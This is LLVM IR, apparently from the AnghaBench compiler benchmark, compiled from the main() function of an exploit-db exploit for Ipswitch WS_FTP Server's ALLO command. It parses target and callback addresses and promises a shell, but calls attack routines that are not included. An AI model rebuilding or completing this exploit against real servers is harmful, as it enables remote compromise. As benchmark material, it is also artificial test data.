; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_165.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_165.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 (i64, i16)*, i32 (i64, i16, i8*, i8*)* }

@.str = private unnamed_addr constant [46 x i8] c"Ipswitch WS_FTP Server <= 4.0.2 ALLO exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [40 x i8] c"(c)2004 Hugh Mann hughmann@hotmail.com\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"anonymous\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"Hugh Mann\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-u\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"-p\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"-a\00", align 1
@output_all = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [30 x i8] c"[-] u n33d t0 s7uddy m0r3...\0A\00", align 1
@.str.8 = private unnamed_addr constant [33 x i8] c"[+] Wait a few secs for a shell\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i16, align 2
  %9 = alloca i64, align 8
  %10 = alloca i16, align 2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.TYPE_2__, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = call i32 @msg(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 @msg(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.1, i64 0, i64 0))
  %17 = call i64 @WSAStartup(i32 514, i32* %6)
  %18 = icmp ne i64 %17, 0
  br i1 %18, label %19, label %20

19:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %152

20:                                               ; preds = %2
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 5
  br i1 %22, label %23, label %28

23:                                               ; preds = %20
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @show_help(i8* %26)
  br label %28

28:                                               ; preds = %23, %20
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @inet_addr(i8* %31)
  %33 = call i64 @ntohl(i32 %32)
  store i64 %33, i64* %7, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 2
  %36 = load i8*, i8** %35, align 8
  %37 = call i64 @atoi(i8* %36)
  %38 = trunc i64 %37 to i16
  store i16 %38, i16* %8, align 2
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 3
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @inet_addr(i8* %41)
  %43 = call i64 @ntohl(i32 %42)
  store i64 %43, i64* %9, align 8
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 4
  %46 = load i8*, i8** %45, align 8
  %47 = call i64 @atoi(i8* %46)
  %48 = trunc i64 %47 to i16
  store i16 %48, i16* %10, align 2
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8** %11, align 8
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8** %12, align 8
  store i32 5, i32* %13, align 4
  br label %49

49:                                               ; preds = %110, %28
  %50 = load i32, i32* %13, align 4
  %51 = load i32, i32* %4, align 4
  %52 = icmp slt i32 %50, %51
  br i1 %52, label %53, label %113

53:                                               ; preds = %49
  %54 = load i8**, i8*** %5, align 8
  %55 = load i32, i32* %13, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i8*, i8** %54, i64 %56
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @strcmp(i8* %58, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0))
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %73, label %61

61:                                               ; preds = %53
  %62 = load i32, i32* %13, align 4
  %63 = add nsw i32 %62, 1
  %64 = load i32, i32* %4, align 4
  %65 = icmp slt i32 %63, %64
  br i1 %65, label %66, label %73

66:                                               ; preds = %61
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %13, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %13, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8*, i8** %67, i64 %70
  %72 = load i8*, i8** %71, align 8
  store i8* %72, i8** %11, align 8
  br label %109

73:                                               ; preds = %61, %53
  %74 = load i8**, i8*** %5, align 8
  %75 = load i32, i32* %13, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8*, i8** %74, i64 %76
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @strcmp(i8* %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %93, label %81

81:                                               ; preds = %73
  %82 = load i32, i32* %13, align 4
  %83 = add nsw i32 %82, 1
  %84 = load i32, i32* %4, align 4
  %85 = icmp slt i32 %83, %84
  br i1 %85, label %86, label %93

86:                                               ; preds = %81
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %13, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8*, i8** %87, i64 %90
  %92 = load i8*, i8** %91, align 8
  store i8* %92, i8** %12, align 8
  br label %108

93:                                               ; preds = %81, %73
  %94 = load i8**, i8*** %5, align 8
  %95 = load i32, i32* %13, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8*, i8** %94, i64 %96
  %98 = load i8*, i8** %97, align 8
  %99 = call i32 @strcmp(i8* %98, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %102, label %101

101:                                              ; preds = %93
  store i32 1, i32* @output_all, align 4
  br label %107

102:                                              ; preds = %93
  %103 = load i8**, i8*** %5, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 0
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @show_help(i8* %105)
  br label %107

107:                                              ; preds = %102, %101
  br label %108

108:                                              ; preds = %107, %86
  br label %109

109:                                              ; preds = %108, %66
  br label %110

110:                                              ; preds = %109
  %111 = load i32, i32* %13, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %13, align 4
  br label %49

113:                                              ; preds = %49
  %114 = load i64, i64* %7, align 8
  %115 = icmp ne i64 %114, 0
  br i1 %115, label %116, label %125

116:                                              ; preds = %113
  %117 = load i16, i16* %8, align 2
  %118 = icmp ne i16 %117, 0
  br i1 %118, label %119, label %125

119:                                              ; preds = %116
  %120 = load i64, i64* %9, align 8
  %121 = icmp ne i64 %120, 0
  br i1 %121, label %122, label %125

122:                                              ; preds = %119
  %123 = load i16, i16* %10, align 2
  %124 = icmp ne i16 %123, 0
  br i1 %124, label %130, label %125

125:                                              ; preds = %122, %119, %116, %113
  %126 = load i8**, i8*** %5, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 0
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @show_help(i8* %128)
  br label %130

130:                                              ; preds = %125, %122
  %131 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %14, i32 0, i32 1
  %132 = load i32 (i64, i16, i8*, i8*)*, i32 (i64, i16, i8*, i8*)** %131, align 8
  %133 = load i64, i64* %7, align 8
  %134 = load i16, i16* %8, align 2
  %135 = load i8*, i8** %11, align 8
  %136 = load i8*, i8** %12, align 8
  %137 = call i32 %132(i64 %133, i16 zeroext %134, i8* %135, i8* %136)
  %138 = icmp ne i32 %137, 0
  br i1 %138, label %140, label %139

139:                                              ; preds = %130
  store i32 0, i32* %3, align 4
  br label %152

140:                                              ; preds = %130
  %141 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %14, i32 0, i32 0
  %142 = load i32 (i64, i16)*, i32 (i64, i16)** %141, align 8
  %143 = load i64, i64* %9, align 8
  %144 = load i16, i16* %10, align 2
  %145 = call i32 %142(i64 %143, i16 zeroext %144)
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %149, label %147

147:                                              ; preds = %140
  %148 = call i32 @msg(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0))
  br label %151

149:                                              ; preds = %140
  %150 = call i32 @msg(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.8, i64 0, i64 0))
  br label %151

151:                                              ; preds = %149, %147
  store i32 0, i32* %3, align 4
  br label %152

152:                                              ; preds = %151, %139, %19
  %153 = load i32, i32* %3, align 4
  ret i32 %153
}

declare dso_local i32 @msg(i8*) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @show_help(i8*) #1

declare dso_local i64 @ntohl(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
